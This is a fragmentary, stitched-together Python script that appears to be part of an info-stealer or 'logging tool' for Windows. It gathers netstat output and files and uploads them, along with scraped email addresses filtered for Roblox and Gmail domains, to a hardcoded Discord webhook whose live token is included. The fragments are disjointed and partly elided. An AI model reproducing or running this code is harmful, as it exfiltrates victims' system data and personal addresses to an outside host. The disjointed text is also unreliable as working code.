...
# Function to get detailed network statistics
def get_netstat_detailed():
    try:
        result = subprocess.run(['netstat', '-n'], capture_output=True, text=True, shell=True)
        return result.stdout.strip()
    except Exception as e:
        return f"Error retrieving detailed network statistics: {e}"
...
try:
    ...
    netstat = get_netstat()
    netstat_detailed = get_netstat_detailed()
    ...
    webhook_url = "https://discord.com/api/webhooks/1301588234014298247/tWlqAIdYEaX1UhQaWxqHBNlY3bPFMnUROgBYoWwHMeiMtylgp_Rt_YQFUaukPdjGRNX3"
    webhook = DiscordWebhook(url=webhook_url, username="Spidey Bot")
    ...
    with open(file_path, "rb") as file:
        webhook.add_file(file=file.read(), filename=file_path)
...
def getEmail(link, fb='', search=''):
    ...
    r = ses.get(link, headers={'User -Agent': 'Mozilla/5.0'})  # Corrected User-Agent
    ...
    for link in links:
        try:
            ...
            if 'mailto' in url:
                found_emails.add(url.split(':')[1])
            elif '@' in link.get_text():
                match = re.findall(r'[\w\.-]+@[\w\.-]+', link.get_text())
                found_emails.update(match)  # Add found emails to the set
            elif 'contact' in url and not search in ['fb', 'contact']:
                cPage = url 
            elif 'facebook' in url or 'fb' in url:
                aFb = url.split(':')[1]                    
        except (KeyError, IndexError) as e:
            print(f"Error occurred while processing links: {e}")

    text = body.get_text()
    match = re.findall(r'[\w\.-]+@[\w\.-]+', text)
    found_emails.update(match)  # Add any emails found in the text

    # Filter for specific domains (Roblox and Gmail)
    filtered_emails = [email for email in found_emails if 'roblox.com' in email or 'gmail.com' in email]

    # Additional logic for contact pages and Facebook pages...
    if 'cPage' in locals():
        try:
            if '/' in cPage[0] and not search:
                print("\t[=] Visiting Contact Page")
                email = getEmail(link + '/' + cPage, search='contact')
                filtered_emails.extend(email)  # Extend the list with found emails
    ...
    if fb and not search:
        ...
        filtered_emails.extend(email)  # Extend the list with found emails
    elif 'aFb' in locals() and not search:
        print("\t[=] Visiting Facebook Page")
        email = getFbEmail(aFb, 'aFb')
        filtered_emails.extend(email)  # Extend the list with found emails

    return list(set(filtered_emails))  # Return unique emails as a list
...
# Example usage
email1 = getEmail('https://mail.google.com/mail/u/0/#inbox')
email2 = getEmail('https://www.youtube.com/', 'https://web.facebook.com/MuhaddiMu')
email3 = getEmail('https://www.facebook.com/', search='fb')

# Discord webhook URL (replace with your actual webhook URL)
webhook_url = 'https://discord.com/api/webhooks/1301588234014298247/tWlqAIdYEaX1UhQaWxqHBNlY3bPFMnUROgBYoWwHMeiMtylgp_Rt_YQFUaukPdjGRNX3'

# Prepare the message with results
message = f"Example 1 Emails: {', '.join(email1)}\nExample 2 Emails: {', '.join(email2)}\nExample 3 Emails: {', '.join(email3)}"
...
# NULL -> Example 3 (Email is Publicly not available)
...
if __name__ == "__main__":
	...
	if os.name == "nt":
		...
		if Utility.CheckForUpdates():
			...
			if response:
				webbrowser.open_new_tab("https://github.com/GoTHeartless/Best-Release-Logging-Tool")
				exit(0)
